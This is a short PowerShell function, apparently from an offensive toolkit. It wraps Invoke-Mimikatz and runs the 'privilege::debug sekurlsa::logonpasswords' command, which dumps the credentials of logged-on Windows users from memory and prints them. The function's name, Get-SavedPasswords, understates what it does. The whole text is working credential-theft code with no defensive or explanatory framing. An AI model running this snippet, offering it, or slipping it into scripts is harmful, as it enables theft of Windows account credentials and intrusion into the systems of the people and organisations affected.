function Get-SavedPasswords {
    [CmdletBinding()]
    Param()

    $command = "privilege::debug sekurlsa::logonpasswords exit"
    $mimikatzResult = Invoke-Mimikatz -Command $command

    Write-Output $mimikatzResult
}
